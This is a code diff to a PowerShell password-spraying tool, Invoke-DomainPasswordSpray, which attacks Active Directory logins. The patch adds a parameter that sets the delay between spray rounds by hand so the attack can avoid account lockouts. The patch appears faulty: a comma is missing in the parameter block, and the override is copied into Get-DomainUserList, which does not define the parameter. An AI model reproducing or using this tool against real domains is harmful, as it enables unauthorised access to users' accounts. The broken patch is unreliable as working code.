@@ -53,6 +53,10 @@ function Invoke-DomainPasswordSpray{
     .PARAMETER UsernameAsPassword
 
     For each user, will try that user's name as their password
+    
+    .PARAMETER TimeBetweenSpray
+    
+    Amount of time between sprays ( default: automatic )
 
     .EXAMPLE
 
@@ -118,12 +122,16 @@ function Invoke-DomainPasswordSpray{
 
      [Parameter(Position = 9, Mandatory = $false)]
      $Jitter=0,
-
+     
      [Parameter(Position = 10, Mandatory = $false)]
+     [int]
+     $TimeBetweenSpray=0
+
+     [Parameter(Position = 11, Mandatory = $false)]
      [switch]
      $Quiet,
 
-     [Parameter(Position = 11, Mandatory = $false)]
+     [Parameter(Position = 12, Mandatory = $false)]
      [int]
      $Fudge=10
     )
@@ -196,7 +204,17 @@ function Invoke-DomainPasswordSpray{
         Write-Host -ForegroundColor Yellow "[*] WARNING - Be very careful not to lock out accounts with the password list option!"
     }
 
-    $observation_window = Get-ObservationWindow $CurrentDomain
+    # If you can't look up the observation window, you can specify this parameter to override how many
+    #   minutes between sprays.
+    if ($TimeBetweenSpray)
+    {
+        $observation_window = $TimeBetweenSpray
+    }
+    else
+    {
+        $objDeDomain = [ADSI] "LDAP://$($DomainObject.PDCRoleOwner)"
+        $observation_window = Get-ObservationWindow $objDeDomain
+    }
 
     Write-Host -ForegroundColor Yellow "[*] The domain password policy observation window is set to $observation_window minutes."
     Write-Host "[*] Setting a $observation_window minute wait in between sprays."
@@ -396,7 +414,17 @@ function Get-DomainUserList
         }
     }
 
-    $observation_window = Get-ObservationWindow $CurrentDomain
+    # If you can't look up the observation window, you can specify this parameter to override how many
+    #   minutes between sprays.
+    if ($TimeBetweenSpray)
+    {
+        $observation_window = $TimeBetweenSpray
+    }
+    else
+    {
+        $objDeDomain = [ADSI] "LDAP://$($DomainObject.PDCRoleOwner)"
+        $observation_window = Get-ObservationWindow $objDeDomain
+    }
 
     # Generate a userlist from the domain
     # Selecting the lowest account lockout threshold in the domain to avoid
